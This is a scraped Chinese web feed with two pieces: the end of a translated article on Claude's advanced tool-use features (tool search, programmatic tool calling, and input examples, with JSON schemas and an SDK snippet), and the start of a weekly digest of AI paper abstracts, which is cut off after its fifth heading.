      <span class="hljs-attr">"priority"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"enum"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"low"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"medium"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"high"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"critical"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"labels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"array"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"items"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"reporter"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
              <span class="hljs-attr">"email"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
              <span class="hljs-attr">"phone"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span>
            <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"due_date"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"escalation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"level"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"integer"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"notify_manager"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"boolean"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"sla_hours"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"integer"</span><span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"title"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>模式定义了什么是有效的，但留下了关键问题未回答：</p>
<ul>
<li><strong>格式歧义</strong>：<code>due_date</code> 应该使用 "2024-11-06"、"Nov 6, 2024" 还是 "2024-11-06T00:00:00Z"？</li>
<li><strong>ID 约定</strong>：<code>reporter.id</code> 是 UUID、"USR-12345" 还是只是 "12345"？</li>
<li><strong>嵌套结构使用</strong>：Claude 应该何时填充 <code>reporter.contact</code>？</li>
<li><strong>参数相关性</strong>：<code>escalation.level</code> 和 <code>escalation.sla_hours</code> 与 priority 如何相关？</li>
</ul>
<p>这些歧义可能导致格式错误的工具调用和不一致的参数使用。</p>
<h3 data-id="heading-17">我们的解决方案</h3>
<p>工具使用示例让您可以直接在工具定义中提供示例工具调用。而不是仅依赖模式，您向 Claude 展示具体的使用模式：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"create_ticket"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"input_schema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">/* 与上面相同的模式 */</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"input_examples"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Login page returns 500 error"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"priority"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"critical"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"labels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"bug"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"authentication"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"production"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"reporter"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"USR-12345"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Jane Smith"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"email"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"jane@acme.com"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"phone"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"+1-555-0123"</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"due_date"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2024-11-06"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"escalation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"level"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"notify_manager"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"sla_hours"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Add dark mode support"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"labels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"feature-request"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"ui"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"reporter"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"USR-67890"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Alex Chen"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Update API documentation"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
</code></pre>
<p>从这三个示例中，Claude 学习到：</p>
<ul>
<li><strong>格式约定</strong>：日期使用 YYYY-MM-DD，用户 ID 遵循 USR-XXXXX，标签使用 kebab-case</li>
<li><strong>嵌套结构模式</strong>：如何构造带有嵌套联系人对象的报告者对象</li>
<li><strong>可选参数相关性</strong>：关键错误有完整联系人信息 + 具有紧 SLA 的升级；功能请求有报告者但没有联系人/升级；内部任务只有标题</li>
</ul>
<p>在我们自己的内部测试中，工具使用示例在复杂参数处理上将准确性从 72% 提高到 90%。</p>
<h3 data-id="heading-18">何时使用工具使用示例</h3>
<p>工具使用示例为您的工具定义添加 tokens，因此当准确性改进超过额外成本时，它们最有价值。</p>
<p><strong>最佳适用场景：</strong></p>
<ul>
<li>复杂嵌套结构，其中有效 JSON 不意味着正确使用</li>
<li>具有许多可选参数且包含模式很重要的工具</li>
<li>具有模式未捕获的特定领域约定的 API</li>
<li>相似工具，其中示例阐明使用哪一个（例如，<code>create_ticket</code> vs <code>create_incident</code>）</li>
</ul>
<p><strong>不太有益时：</strong></p>
<ul>
<li>具有明显使用的简单单参数工具</li>
<li>Claude 已理解的标准格式，如 URL 或电子邮件</li>
<li>更适合由 JSON Schema 约束处理的验证问题</li>
</ul>
<h2 data-id="heading-19">最佳实践</h2>
<p>构建采取现实世界行动的 agents 意味着同时处理规模、复杂性和精确性。这三个功能共同解决工具使用工作流中的不同瓶颈。以下是有效结合它们的方法。</p>
<h3 data-id="heading-20">战略性地分层功能</h3>
<p>并非每个 agent 都需要为给定任务使用所有三个功能。从您最大的瓶颈开始：</p>
<ul>
<li>工具定义的上下文膨胀 → 工具搜索工具</li>
<li>大型中间结果污染上下文 → 程序化工具调用</li>
<li>参数错误和格式错误的调用 → 工具使用示例</li>
</ul>
<p>这种专注的方法让您解决限制 agent 性能的特定约束，而不是预先添加复杂性。</p>
<p>然后根据需要分层附加功能。它们是互补的：工具搜索工具确保找到正确的工具，程序化工具调用确保高效执行，工具使用示例确保正确调用。</p>
<h3 data-id="heading-21">设置工具搜索工具以更好地发现</h3>
<p>工具搜索匹配名称和描述，因此清晰、描述性的定义提高发现准确性。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 好的</span>
{
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"search_customer_orders"</span>,
    <span class="hljs-string">"description"</span>: <span class="hljs-string">"Search for customer orders by date range, status, or total amount. Returns order details including items, shipping, and payment info."</span>
}

<span class="hljs-comment">// 坏的</span>
{
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"query_db_orders"</span>,
    <span class="hljs-string">"description"</span>: <span class="hljs-string">"Execute order query"</span>
}
</code></pre>
<p>添加系统提示指导，以便 Claude 知道可用的内容：</p>
<pre><code class="hljs language-text" lang="text">您有权访问 Slack 消息、Google Drive 文件管理、
Jira 工单跟踪和 GitHub 仓库操作的工具。使用工具搜索
查找特定功能。
</code></pre>
<p>保持您最常用的三到五个工具始终加载，延迟其余的。这平衡了常见操作的即时访问和其他一切的按需发现。</p>
<h3 data-id="heading-22">设置程序化工具调用以正确执行</h3>
<p>由于 Claude 编写代码来解析工具输出，请清楚地记录返回格式。这有助于 Claude 编写正确的解析逻辑：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_orders"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Retrieve orders for a customer.
Returns:
    List of order objects, each containing:
    - id (str): Order identifier
    - total (float): Order total in USD
    - status (str): One of 'pending', 'shipped', 'delivered'
    - items (list): Array of {sku, quantity, price}
    - created_at (str): ISO 8601 timestamp"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>请参阅下面选择加入的程序化编排受益的工具：</p>
<ul>
<li>可以并行运行的工具（独立操作）</li>
<li>可安全重试的操作（幂等）</li>
</ul>
<h3 data-id="heading-23">设置工具使用示例以获得参数准确性</h3>
<p>为行为清晰度精心设计示例：</p>
<ul>
<li>使用真实数据（真实城市名称、合理价格，而不是 "string" 或 "value"）</li>
<li>展示最少、部分和完整规范模式的多样性</li>
<li>保持简洁：每个工具 1-5 个示例</li>
<li>关注歧义（仅在正确使用从模式中不明显的地方添加示例）</li>
</ul>
<h2 data-id="heading-24">开始使用</h2>
<p>这些功能在 beta 中可用。要启用它们，添加 beta 标题并包含您需要的工具：</p>
<pre><code class="hljs language-python" lang="python">client.beta.messages.create(
    betas=[<span class="hljs-string">"advanced-tool-use-2025-11-20"</span>],
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    max_tokens=<span class="hljs-number">4096</span>,
    tools=[
        {<span class="hljs-string">"type"</span>: <span class="hljs-string">"tool_search_tool_regex_20251119"</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"tool_search_tool_regex"</span>},
        {<span class="hljs-string">"type"</span>: <span class="hljs-string">"code_execution_20250825"</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"code_execution"</span>},
        <span class="hljs-comment"># 您的带有 defer_loading、allowed_callers 和 input_examples 的工具</span>
    ]
)
</code></pre>
<p>有关详细的 API 文档和 SDK 示例，请参阅：</p>
<ul>
<li>工具搜索工具的文档和 cookbook</li>
<li>程序化工具调用的文档和 cookbook</li>
<li>工具使用示例的文档</li>
</ul>
<p>这些功能将工具使用从简单的函数调用转向智能编排。当 agents 处理跨越数十个工具和大型数据集的更复杂工作流时，动态发现、高效执行和可靠调用成为基础。</p>
<p>我们期待看到您构建的东西。</p>
<h2 data-id="heading-25">致谢</h2>
<p>由 Bin Wu 撰写，Adam Jones、Artur Renault、Henry Tay、Jake Noble、Nathan McCandlish、Noah Picard、Sam Jiang 和 Claude 开发者平台团队贡献。这项工作建立在 Chris Gorgolewski、Daniel Jiang、Jeremy Fox 和 Mike Lambert 的基础研究之上。我们也从整个 AI 生态系统中汲取灵感，包括 Joel Pobar 的 LLMVM、Cloudflare 的代码模式和代码执行作为 MCP。特别感谢 Andy Schumeister、Hamish Kerr、Keir Bradwell、Matt Bleifer 和 Molly Vorwerck 的支持。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[每周AI论文速递（251201-251205）]]></title>    <link>https://juejin.cn/post/7580278296837996578</link>    <guid>https://juejin.cn/post/7580278296837996578</guid>    <pubDate>2025-12-06T17:02:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580278296837996578" data-draft-id="7580288235030855680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="每周AI论文速递（251201-251205）"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-06T17:02:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="叶子的技术碎碎念"/> <meta itemprop="url" content="https://juejin.cn/user/2831954919569245"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            每周AI论文速递（251201-251205）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2831954919569245/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    叶子的技术碎碎念
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T17:02:12.000Z" title="Sat Dec 06 2025 17:02:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读31分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">From Code Foundation Models to Agents and Applications: A Practical Guide to Code Intelligence</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.18538" target="_blank" title="https://arxiv.org/abs/2511.18538" ref="nofollow noopener noreferrer">从代码基础模型到智能体与应用：代码智能实用指南</a></p>
<p>大语言模型 (LLMs) 从根本上改变了自动化软件开发，实现了将自然语言描述直接转换为功能代码，并通过诸如 GitHub Copilot (Microsoft)、Cursor (Anysphere)、Trae (ByteDance) 和 Claude Code (Anthropic) 等工具推动了商业应用。该领域已从基于规则的系统演进为基于 Transformer 的架构，在 HumanEval 等基准测试上的性能从个位数成功率提升至超过 95%。在本工作中，我们提供了一份关于代码大语言模型的全面综述与实用指南（包含一系列分析和探索性实验），系统性地审视了从数据管理到后训练的完整模型生命周期，涉及高级提示范式、代码预训练、监督微调、强化学习以及自主编码智能体。我们评估了通用大语言模型（GPT-4、Claude、LLaMA）与代码专用大语言模型（StarCoder、Code LLaMA、DeepSeek-Coder、QwenCoder）的代码能力，并批判性地探讨了相关技术、设计决策及其权衡。此外，我们阐明了学术研究（例如基准测试与任务）与实际部署（例如软件相关的代码任务）之间的差距，涵盖代码正确性、安全性、大型代码库的上下文感知以及与开发工作流的集成，并将有前景的研究方向与实际需求相关联。最后，我们通过一系列实验，对代码预训练、监督微调和强化学习进行了全面分析，内容涵盖缩放定律、框架选择、超参数敏感性、模型架构和数据集比较。</p>
<h2 data-id="heading-1">DeepSeek-V3.2: Pushing the Frontier of Open Large Language Models</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.02556" target="_blank" title="https://arxiv.org/abs/2512.02556" ref="nofollow noopener noreferrer">DeepSeek-V3.2: 推动开源大语言模型的前沿</a></p>
<p>我们推出 DeepSeek-V3.2，这是一个将高效计算与卓越的推理及智能体性能融为一体的模型。DeepSeek-V3.2 的关键技术突破如下：(1) DeepSeek 稀疏注意力 (DSA)：我们引入了 DSA，这是一种高效的注意力机制，能在长上下文场景中显著降低计算复杂度，同时保持模型性能。(2) 可扩展的强化学习框架：通过采用稳健的强化学习协议并扩展后训练阶段的计算规模，DeepSeek-V3.2 的性能与 GPT-5 相当。值得注意的是，我们的高计算配置变体 DeepSeek-V3.2-Speciale 超越了 GPT-5，其推理能力与 Gemini-3.0-Pro 并驾齐驱，在 2025 年国际数学奥林匹克竞赛 (IMO) 和国际信息学奥林匹克竞赛 (IOI) 中均取得了金牌级别的成绩。(3) 大规模面向智能体的任务合成流水线：为了将推理能力融入工具使用场景，我们开发了一种新颖的合成流水线，能够系统性地大规模生成训练数据。该方法支持可扩展的智能体后训练，从而在复杂、交互式的环境中，显著提升了模型的泛化能力和遵循指令的鲁棒性。</p>
<h2 data-id="heading-2">LongVT: 通过原生工具调用实现“长视频思维”</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.20785" target="_blank" title="https://arxiv.org/abs/2511.20785" ref="nofollow noopener noreferrer">LongVT: 通过原生工具调用实现“长视频思维”</a></p>
<p>大模态模型 (Large Multimodal Models, LMMs) 在结合文本思维链进行视频推理方面展现出巨大潜力。然而，它们仍易产生幻觉，尤其是在处理那些证据稀疏且时间分布分散的长视频时。受人类理解长视频方式（先全局概览，再细查相关片段）的启发，我们提出了 LongVT，一个端到端的智能体框架。该框架通过交错进行的“多模态工具调用思维链”，实现了“用长视频进行思考”。具体而言，我们将 LMMs 固有的时间定位能力作为一种原生视频裁剪工具，用于聚焦特定视频片段并重新采样更细粒度的视频帧。这种从全局到局部的推理循环会持续进行，直至答案能够基于检索到的视觉证据得到确认。针对长视频推理任务中细粒度问答 (QA) 数据稀缺的问题，我们构建并将发布一个名为 VideoSIAH 的数据套件，以支持模型的训练与评估。具体来说，我们的训练数据集包含：24.79 万个用于工具集成冷启动监督微调的样本、1600 个用于智能体强化学习的样本，以及 1.54 万个用于智能体强化微调的样本。我们的评估基准包含 1280 个 QA 对，这些数据通过一个半自动的数据流水线精心构建，并经过了人工验证。通过精心设计的三阶段训练策略和广泛的实证评估，LongVT 在四个具有挑战性的长视频理解与推理基准测试中，均持续超越现有的强基线模型。我们的代码、数据及模型检查点均已公开，地址为：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEvolvingLMMs-Lab%2FLongVT%25E3%2580%2582" target="_blank" title="https://github.com/EvolvingLMMs-Lab/LongVT%E3%80%82" ref="nofollow noopener noreferrer">github.com/EvolvingLMM…</a></p>
<h2 data-id="heading-3">Z-Image: An Efficient Image Generation Foundation Model with Single-Stream Diffusion Transformer</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.22699" target="_blank" title="https://arxiv.org/abs/2511.22699" ref="nofollow noopener noreferrer">Z-Image: 基于单流扩散Transformer的高效图像生成基础模型</a></p>
<p>当前，高性能图像生成领域主要由专有系统主导，例如 Nano Banana Pro 和 Seedream 4.0。而领先的开源替代方案，如 Qwen-Image、Hunyuan-Image-3.0 和 FLUX.2，则普遍参数量庞大 (200亿至800亿)，导致其在消费级硬件上进行推理和微调都极不现实。为弥补这一空白，我们提出了 Z-Image，这是一个参数规模为 60亿 的高效基础生成模型。它基于可扩展单流扩散Transformer (Scalable Single-Stream Diffusion Transformer, S3-DiT) 架构构建，旨在挑战“不计成本堆叠规模”的行业范式。通过对整个模型生命周期进行系统性优化——从精心构建的数据基础设施到高效精简的训练方案——我们仅消耗了 31.4万 H800 GPU 小时 (约合 63万美元) 便完成了完整的训练流程。我们结合奖励后训练的少步蒸馏方案进一步得到了 Z-Image-Turbo，该版本不仅能在企业级 H800 GPU 上实现亚秒级推理延迟，还能兼容显存小于 16GB 的消费级硬件。此外，我们的全预训练范式也支持高效训练出 Z-Image-Edit，这是一个具备出色指令遵循能力的图像编辑模型。定性与定量实验均表明，我们的模型在多个维度上的性能均可比肩乃至超越领先的竞争对手。尤为突出的是，Z-Image 在生成逼真图像和渲染双语文本方面表现卓越，其效果足以媲美顶尖的商业模型。这证明了，即使大幅降低计算开销，同样能够实现最先进的性能。为促进可获取、低成本且性能领先的生成模型发展，我们已公开代码、模型权重并提供在线演示。</p>
<h2 data-id="heading-4">Live Avatar: 流式实时音频驱动的无限长度虚拟形象生成</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.04677" target="_blank" title="https://arxiv.org/abs/2512.04677" ref="nofollow noopener noreferrer">Live Avatar: 流式实时音频驱动的无限长度虚拟形象生成</a></p>
